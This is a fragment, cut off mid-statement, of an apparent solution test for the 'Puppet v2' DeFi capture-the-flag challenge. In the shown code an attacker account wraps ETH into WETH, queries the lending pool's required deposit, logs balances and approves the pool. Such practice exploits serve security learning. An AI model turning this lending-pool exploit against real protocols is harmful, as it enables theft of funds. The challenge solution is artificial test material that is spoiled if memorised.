...
describe("[Challenge] Puppet v2", function () {
	...
	it("Exploit", async function () {
		...
		await expect(
			this.weth
				.connect(attacker)
				.deposit({ value: ethers.utils.parseEther("19.9") })
		).to.not.be.reverted;
		...
		const reqEth = await this.lendingPool.calculateDepositOfWETHRequired(
			POOL_INITIAL_TOKEN_BALANCE
		);
		console.log(ethers.utils.formatEther(reqEth));

		const attackerWETHBalance = await this.weth.balanceOf(attacker.address);
		console.log("WETH Balance", ethers.utils.formatEther(attackerWETHBalance));

		await expect(
			this.weth
				.connect(attacker)
				.approve(this.lendingPool.address, ethers.utils.parseEther("100"))
		).to.not.be.reverted;
		await expect(
